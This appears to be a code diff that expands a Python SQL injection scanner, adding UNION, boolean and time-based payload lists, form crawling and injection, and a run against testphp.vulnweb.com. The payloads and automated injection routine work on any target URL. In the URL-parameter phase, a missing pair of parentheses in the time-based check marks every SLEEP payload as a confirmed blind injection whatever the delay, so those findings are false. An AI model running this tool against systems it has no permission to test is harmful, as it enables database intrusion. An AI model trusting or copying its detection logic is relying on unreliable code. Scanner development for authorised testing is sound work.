@@ -1,97 +1,177 @@
 # scanners/sqli_scan.py
 import requests
+import time
 import urllib3
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+from bs4 import BeautifulSoup
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
 
 # Hide SSL warnings for targets with bad certificates
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# The Error Signatures: If any of these appear in the HTML, the database is vulnerable.
+# Expanded Error Signatures from the Bomberbot guide
 SQL_ERRORS = [
-    # MySQL
     "you have an error in your sql syntax",
     "warning: mysql",
     "mysql_fetch_array()",
     "mysql_fetch_assoc()",
-    # SQL Server
     "unclosed quotation mark after the character string",
     "microsoft sql native client error",
     "odbc sql server driver",
-    # PostgreSQL
     "syntax error at or near",
     "valid postgresql error",
-    # Oracle
     "ora-00933",
     "quoted string not properly terminated",
-    "oracle error"
+    "oracle error",
+    "sql syntax error",
+    "sqlserver error",
+    "microsoft ole db provider for odbc drivers error",
+    "microsoft ole db provider for sql server error"
 ]
 
+# Advanced Payloads including UNION and Time-based injections
+PAYLOADS = [
+    "' OR '1'='1",
+    "\" OR \"1\"=\"1",
+    "' OR '1'='1' --",
+    "' UNION SELECT NULL,NULL,NULL--",
+    "1' ORDER BY 1--+",
+    "1' AND SLEEP(5)--",
+    "'; WAITFOR DELAY '0:0:5'--",
+    "1; SELECT pg_sleep(5)--"
+]
+
+def get_form_details(form):
+    """Extracts all action, method, and input details from an HTML form."""
+    details = {}
+    action = form.attrs.get("action", "").lower()
+    method = form.attrs.get("method", "get").lower()
+    inputs = []
+
+    for input_tag in form.find_all("input"):
+        input_type = input_tag.attrs.get("type", "text")
+        input_name = input_tag.attrs.get("name")
+        input_value = input_tag.attrs.get("value", "")
+        if input_name:
+            inputs.append({"type": input_type, "name": input_name, "value": input_value})
+
+    details["action"] = action
+    details["method"] = method
+    details["inputs"] = inputs
+    return details
+
 def run_sqli_scan(target_url: str) -> dict:
-    # Characters that break SQL syntax
-    payloads = ["'", "\"", "`", "')", "';", "\\"]
-    
     details = []
+    session = requests.Session()
+    session.headers["User-Agent"] = "VULKN_Scanner/1.0"
     
-    # Parse the URL to find query parameters (e.g., ?id=1)
+    # --- PHASE 1: URL PARAMETER INJECTION ---
     parsed_url = urlparse(target_url)
     query_params = parse_qs(parsed_url.query)
     
-    # List of URLs to test. We always test the raw URL + dummy param just in case
-    test_urls = []
-    if not query_params:
-        # If no params exist, append a dummy one to test
-        for payload in payloads:
-            test_urls.append(f"{target_url}?id={payload}")
-    else:
-        # If params exist (e.g., id=1), inject payload into each parameter
-        for payload in payloads:
+    if query_params:
+        for payload in PAYLOADS:
             for key, values in query_params.items():
-                for value in values:
-                    # Create a copy of the params and inject the payload
-                    malicious_params = query_params.copy()
-                    malicious_params[key] = [value + payload]
-                    
-                    # Rebuild the malicious URL
-                    malicious_query = urlencode(malicious_params, doseq=True)
-                    malicious_url = urlunparse(list(parsed_url[:4]) + [malicious_query] + list(parsed_url[5:]))
-                    test_urls.append(malicious_url)
-
-    # Execute the scan
-    for test_url in test_urls:
-        try:
-            response = requests.get(test_url, timeout=5, verify=False)
-            response_text = response.text.lower()
-            
-            # Scan the HTML response for any known database errors
-            for error in SQL_ERRORS:
-                if error in response_text:
-                    details.append({
-                        "type": "Error-Based SQL Injection",
-                        "payload_used": test_url,
-                        "severity": "Critical",
-                        "description": f"Database syntax error leaked in HTTP response. Matched signature: '{error}'"
-                    })
-                    break # Break inner loop so we don't duplicate logs for multiple matches
-                    
-            if details:
-                break # If we confirmed SQLi, stop spamming the server with more payloads
+                malicious_params = query_params.copy()
+                malicious_params[key] = [values[0] + payload]
+                malicious_query = urlencode(malicious_params, doseq=True)
+                test_url = urlunparse(list(parsed_url[:4]) + [malicious_query] + list(parsed_url[5:]))
                 
-        except requests.RequestException:
-            continue
+                try:
+                    start_time = time.time()
+                    response = session.get(test_url, timeout=10, verify=False)
+                    end_time = time.time()
+                    response_text = response.text.lower()
+                    
+                    # Error-Based Check
+                    for error in SQL_ERRORS:
+                        if error in response_text:
+                            details.append({
+                                "type": "Error-Based SQLi (URL Param)",
+                                "payload_used": payload,
+                                "severity": "Critical",
+                                "description": f"Database syntax error leaked. Matched signature: '{error}'"
+                            })
+                            break
+                    
+                    # Time-Based Check
+                    if (end_time - start_time) > 4.5 and "delay" in payload.lower() or "sleep" in payload.lower():
+                        details.append({
+                            "type": "Time-Based Blind SQLi (URL Param)",
+                            "payload_used": payload,
+                            "severity": "Critical",
+                            "description": "Server delayed response by > 5 seconds, confirming successful blind injection."
+                        })
+                except requests.RequestException:
+                    continue
+
+    # --- PHASE 2: HTML FORM INJECTION ---
+    try:
+        response = session.get(target_url, timeout=5, verify=False)
+        soup = BeautifulSoup(response.content, "lxml")
+        forms = soup.find_all("form")
+        
+        for form in forms:
+            form_details = get_form_details(form)
+            form_url = urljoin(target_url, form_details["action"])
+            
+            for payload in PAYLOADS:
+                data = {}
+                for input_data in form_details["inputs"]:
+                    if input_data["type"] == "hidden" or input_data["value"]:
+                        data[input_data["name"]] = input_data["value"]
+                    elif input_data["type"] != "submit":
+                        data[input_data["name"]] = payload
+
+                try:
+                    start_time = time.time()
+                    if form_details["method"] == "post":
+                        res = session.post(form_url, data=data, timeout=10, verify=False)
+                    else:
+                        res = session.get(form_url, params=data, timeout=10, verify=False)
+                    end_time = time.time()
+                    
+                    res_text = res.text.lower()
+                    
+                    # Error-Based Check
+                    for error in SQL_ERRORS:
+                        if error in res_text:
+                            details.append({
+                                "type": "Error-Based SQLi (Form Input)",
+                                "payload_used": payload,
+                                "severity": "Critical",
+                                "description": f"Form at {form_url} is vulnerable. Matched signature: '{error}'"
+                            })
+                            break
+                            
+                    # Time-Based Check
+                    if (end_time - start_time) > 4.5 and ("delay" in payload.lower() or "sleep" in payload.lower()):
+                        details.append({
+                            "type": "Time-Based Blind SQLi (Form Input)",
+                            "payload_used": payload,
+                            "severity": "Critical",
+                            "description": f"Form at {form_url} delayed response by > 5 seconds."
+                        })
+                except requests.RequestException:
+                    continue
+                    
+    except requests.RequestException as e:
+        pass # Target might be unreachable
+
+    # Deduplicate findings so we don't spam the JSON report
+    unique_details = [dict(t) for t in {tuple(d.items()) for d in details}]
 
     return {
-        "scanner_name": "SQL Injection (Error-Based)",
+        "scanner_name": "Advanced SQL Injection Engine",
         "target_url": target_url,
-        "vulnerabilities_found": len(details),
-        "details": details
+        "vulnerabilities_found": len(unique_details),
+        "details": unique_details
     }
 
 # Test it locally!
 if __name__ == "__main__":
     import json
-    # testphp.vulnweb.com is a legal, intentionally vulnerable site built for testing tools!
     vulnerable_target = "http://testphp.vulnweb.com/artists.php?artist=1"
     
-    print("Scanning for SQLi...")
+    print("Running advanced SQLi scan (Forms & Time-Based included)...")
     result = run_sqli_scan(vulnerable_target)
     print(json.dumps(result, indent=4))
